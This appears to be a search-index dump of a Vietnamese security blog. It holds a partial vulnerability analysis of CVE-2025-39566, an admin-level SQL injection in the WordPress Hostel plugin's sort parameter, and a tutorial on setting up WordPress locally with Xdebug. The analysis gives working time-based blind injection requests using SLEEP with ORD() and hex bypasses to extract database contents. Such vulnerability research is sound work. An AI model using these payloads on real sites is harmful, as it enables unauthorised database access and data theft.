$limit_sql\u0026#34;); Câu query nằm trong nhánh default của cấu trúc switch.\nToàn bộ đoạn xử lý naỳ thuộc về hàm static manage() của class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiếp với core thông qua Plugin API (Hook System). Do đó, để xác định nơi hàm manage() được gọi, ta có thể tìm kiếm từ khóa \u0026quot;manage\u0026quot; trong thư mục chứa plugin.\nTrong file models/hostel.php ta có hàm:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Ở đây:\nadd_menu_page() tạo menu chính trong Admin Dashboard. add_submenu_page() thêm các submenu con cho menu đó. Tham số $callback là một callback function sẽ được gọi khi người dùng click vào menu/submenu. Ví dụ:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Tất cả menu/submenu này đều được đăng ký bên trong hàm static menu() của class WPHostel. Do đó, để xác định nơi hàm menu() được gọi, ta có thể tìm kiếm từ khóa menu trong thư mục chứa plugin.\nTrong file hostel.php ở thư mục gốc của plugin ta có:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. Hook name ở đây là admin_menu, nghĩa là hàm WPHostel::menu() sẽ được gọi trong vòng đời khi WordPress dựng Admin Dashboard Menu. Menu trên UI Admin Dashboard\nDebugging\nChức năng bị lỗi nằm trong Booking Manager, vì vậy ta truy cập vào submenu Manager Bookings trên UI Admin Dashboard. Ngay trước nhánh default có comment // list bookings =\u0026gt; cho thấy đoạn code này xử lý việc liệt kê và sắp xếp bookings Mở debugger: Click Run with Debugger. Đặt breakpoint tại nhánh switch chứa code lỗi và tại dòng code gây lỗi. Khi click vào một cột trong bảng bookings, quan sát: Debugger nhảy vào cấu trúc switch. Dùng Step Over, debugger đi tiếp vào nhánh default. Tiếp tục Step Over và theo dõi giá trị biến trong tab Variables \u0026gt; Locals. Các biến này sẽ kết hợp để tạo thành câu SQL bên dưới. Sau khi ghép các biến, câu query đầy đủ có dạng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Đáng chú ý, biến $orderby được gán như sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Ở đây có điểm bất thường:\nPhần sau ORDER BY sử dụng sanitize_text_field(). Hàm này chỉ làm sạch HTML, không hề filter hoặc validate để đảm bảo an toàn trong SQL context. Tham số ob (do người dùng truyền vào) vì vậy có thể bị lợi dụng để chèn trực tiếp vào câu SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tách mệnh đề ORDER BY bằng , vì nó chấp nhập multi column\nKết quả: thời gian phản hồi bị delay =\u0026gt; SQL Injection thành công.\nDump Data from Database Bypass ' using ORD():\nĐể dump dữ liệu của database ta cần thử để lấy ký tự đầu tiên của database name.\nDo sanitize_text_field() loại bỏ ', ta không dùng được payload so sánh trực tiếp. Thay vào đó dùng ORD() để so sánh ký tự theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Thành công bypass =\u0026gt; có thể trích xuất tên database.\nBypass ' using Hex encoding (extend)\nNgoài ORD() ta có thể sử dụng Hex encoding để bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Thành công bypass =\u0026gt; có thể trích xuất tên database.\nConclusion Lỗ hổng CVE-2025-39566 trong plugin WordPress Hostel trước phiên bản 1.1.5.7, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ chống SQL Injection Cần phân biệt rõ: lọc input cho HTML vs cho SQL References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLỗ hổng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trước phiên bản \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do việc làm sạch dữ liệu không đúng cách, điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu, bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) và v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ \u003cstrong\u003eGET\u003c/strong\u003e request vào SQL query mà cơ chế kiểm soát không chặt chẽ.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.\nRa đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page… Hiện nay, hơn 40% website trên thế giới chạy bằng WordPress. Có 2 phiên bản WordPress:\nWordPress.com Dịch vụ hosting do Automattic cung cấp Bạn chỉ cần đăng ký tài khoản, không phải cài đặt Hạn chế tùy chỉnh, muốn nâng cao thì phải trả phí WordPress.org Mã nguồn mở, bạn tự tải về và cài đặt lên hosting/server riêng Tùy chỉnh toàn diện, có thể cài plugin, theme, viết code, tạo website theo ý mình Ecosystem Core: CMS chính Plugin: Một phần mềm bổ sung có thể được cài đặt trên trang web WordPress để mở rộng chức năng của nó và thêm các tính năng mới Themes: Một phần mềm bổ sung đại diện cho sự xuất hiện trực quan và bố cục của một trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiện tại hơn 40% website trên toàn thế giới chạy WordPress Nghĩa là hacker chỉ cần tìm ra một lỗ hổng phổ biến =\u0026gt; có thể khai thác hàng triệu site cùng lúc Giống như “cá nhiều thì chài ở đó” Plugin and Theme WordPress Core đã được xem xét trong 1 thời gian dài bởi hàng ngàn developers và researchers. Kết quả là rất khó để kẻ tấn công có thể đột nhập vào Tuy nhiên, có hàng chục ngàn plugin và theme từ nhiều nguồn, chất lượng không đồng đều được sử dụng Nhiều plugin code bảo mật kém, không còn được cập nhật. Hacker chỉ cần scan plugin/theme để tìm version lỗi thời, rồi khai thác Setup WordPress for Hacking Có rất nhiều cách để setup WorkPress, tìm kiếm bằng Google có thể cung cấp nhiều bài viết về nó. Ở đây tôi sẽ setup trên máy ảo Ubuntu (22.04):\nKhông ảnh hưởng đến các dịch vụ của máy thật WordPress tương đối nhẹ để sử dụng trên máy ảo Install and configure WordPress Install Dependencies Cài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Tải và cài mã nguồn WordPress vào thư mục web.\n# Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro:\nUbuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. Configure Apache for WordPress Tạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress:\n# Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Kích hoạt site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite:\nsudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option):\nsudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị \u0026ldquo;It works!\u0026rdquo;) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database WordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu:\nBài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root:\nsudo mysql -u root Cấu hình MySQL:\n-- Tạo database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u0026gt; quit Bye Khởi động lại dịch vụ:\nsudo service mysql start Configure WordPress to connect to the database Copy file cấu hình mẫu:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi tải về có sẵn file wp-config-sample.php Bạn copy nó thành wp-config.php để làm file cấu hình chính cho site Chỉnh sửa thông tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Đây là 3 dòng thay thế text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tên DB đã tạo ở bước trước) username_here =\u0026gt; wordpress (user MySQL đã tạo) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password đã set) Khi Apache chạy WordPress, nó sẽ đọc file này để biết dùng user nào + DB nào để kết nối MySQL Thêm Secret Keys và Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php 👉 Đây là chuỗi bí mật mà WordPress dùng để:\nMã hóa session cookies Sinh ra token (nonce) chống CSRF Ngăn chặn tấn công kiểu “known secret” (ví dụ kẻ tấn công đoán được secret mặc định để giả mạo login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay đổi nó bằng các chuỗi random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cập http://localhost, đặt site title, username, password, email cho user admin\nSetup Debug on VSCode Để hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó.\nAdd PHP Debug extension on VS Code Vào Extensions (Ctrl+Shift+X) =\u0026gt; tìm PHP Debug (by Felix Becker) =\u0026gt; Install. Extension này kết nối với Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiểm tra cài chưa:\nphp -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Thêm vào cuối file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003.\nSau đó restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Mở thư mục chứa trang web wordpress bằng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; tạo file launch.json với nội dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code.\nNhư vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode.\nExtend Required Version Mỗi phiên bản WordPress thường đi kèm 1 phiên bản PHP thích hợp. Nên kiểm tra tính tương thích này để quá trình setup không bị lỗi.\nWordPress Auto Update Từ WordPress 3.7 trở đi (2013), WordPress có cơ chế tự động cập nhật (automatic background updates) cho:\nBản vá bảo mật (security release). Bản bảo trì (maintenance release). Không tự động update major version (trừ khi bật rõ ràng). Hệ thống kiểm tra với server api.wordpress.org để xem có bản vá nào mới sẽ tự động nâng cấp background lên. Việc này diễn ra rất nhanh sau khi setup, nên bạn thấy code đổi khác so với source gốc.\nQuá trình setup diễn ra khi truy cập /wp-admin/install.php\nĐể vô hiệu hóa cơ chế cập nhật tự động này, thêm dòng sau vào wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Mặc định, WordPress phụ thuộc vào cấu hình PHP (upload_max_filesize, post_max_size, và đôi khi cả max_execution_time) để xác định dung lượng file tối đa có thể upload. Trên nhiều hosting, giới hạn này chỉ khoảng 2MB – 8MB, không đủ cho các plugin hiện đại.\nWhy Increase the Limit? Plugin dung lượng lớn: Các plugin như WooCommerce extension, page builder, backup, hoặc security suite có thể nặng 20MB – 100MB.\nTránh lỗi upload: Nếu file .zip lớn hơn giới hạn, bạn sẽ gặp lỗi:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Hoặc upload thất bại. Thuận tiện cho quản trị viên: Có thể cài trực tiếp qua Dashboard mà không cần FTP/SSH.\nHỗ trợ phát triển plugin: Plugin tự viết kèm nhiều thư viện/asset có thể khá nặng, việc tăng giới hạn giúp test dễ dàng hơn.\nHow to Increase Plugin Upload Size Sửa php.ini (nếu có quyền server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sửa file .htaccess (nếu dùng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Thêm vào wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 Lời khuyên: Chỉ nên đặt giới hạn vừa đủ (64MB hoặc 128MB). Tránh đặt quá lớn để hạn chế nguy cơ bị upload file nặng gây quá tải server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page…\u003c/li\u003e\n\u003cli\u003eHiện nay, hơn 40% website trên thế giới chạy bằng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCó 2 phiên bản WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"}]